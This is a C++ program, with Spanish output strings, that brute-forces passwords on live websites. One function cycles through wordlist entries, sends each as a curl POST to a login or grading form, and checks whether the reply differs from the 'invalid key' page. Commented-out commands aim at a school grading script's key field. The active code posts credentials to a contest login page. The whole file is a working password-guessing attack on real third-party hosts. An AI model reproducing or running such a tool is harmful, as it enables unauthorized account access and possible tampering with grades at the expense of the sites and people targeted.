/* system example : DIR */
#include <stdio.h>      /* printf */
#include <stdlib.h>     /* system, NULL, EXIT_FAILURE */
#include <iostream>
#include <algorithm>
#include <vector>
using namespace std;

string res = " \tClave invalida.        <form name=\"Forma2\" id=\"Forma2\" action=\"PROMEDIOS.php\" method=\"post\">";
char cadena[] = "0123456789QWERTYUIOPASDFGHJKLZXCVBNM";
vector <string> fuente;
bool funcion5(string k)
{
    string s;
    int contador;    
    k[85] = 'T';
    for (int i = 23683; i < fuente.size(); ++i)    
    {                      
        auto &pp = fuente[i];        
        k[86] = pp[0];
        k[87] = pp[1];
        k[88] = pp[2];
        k[89] = pp[3];
        k[90] = pp[4];
        
        system (k.c_str());
        cin.clear();
        freopen("t6.txt", "r", stdin);
        contador = 10;
        while ( contador-- )getline(cin, s);
        if ( s!= res )
        {
            cout<<res<<"\n";
            cout<<s<<"\n";
            cout<<k<<"\n";
            printf("Lo lograste\n");                            
            return true;
        }
        fclose(stdin);        
    }
    return false;
}




int main ()
{
    string pp;
    //freopen("dic6.in", "r", stdin);
    //while (cin>>pp) fuente.push_back(pp);
    //fclose(stdin);
    int i;
    printf ("Checking if processor is available...");
    if (system(NULL)) puts ("Ok");
    else exit (EXIT_FAILURE);
    printf ("Executing command...\n");

    //string k4="curl --request POST 'http://lilianagf.com.mx/MAC/scripts/CLAVEPRO.php' --data 'clave=1234&lista=44&calificar=CALIFICAR' --connect-timeout 3000 > t6.txt";
    //string k5="curl --request POST 'http://lilianagf.com.mx/MAC/scripts/CLAVEPRO.php' --data 'clave=12345&lista=44&calificar=CALIFICAR' --connect-timeout 3000 > t6.txt";
    //string k6="curl --request POST 'http://lilianagf.com.mx/MAC/scripts/CLAVEPRO.php' --data 'clave=123456&lista=44&calificar=CALIFICAR' --connect-timeout 3000 > t6.txt";

    //funcion5(k6);
    string k="curl --request POST 'http://redprogramacioncompetitiva.com/contests/2017/03/index.php' --data 'user=hombres%20C&password=team114' --connect-timeout 3000 > t6.txt";
    system (k.c_str());
    printf("ni modos\n");
    return 0;
}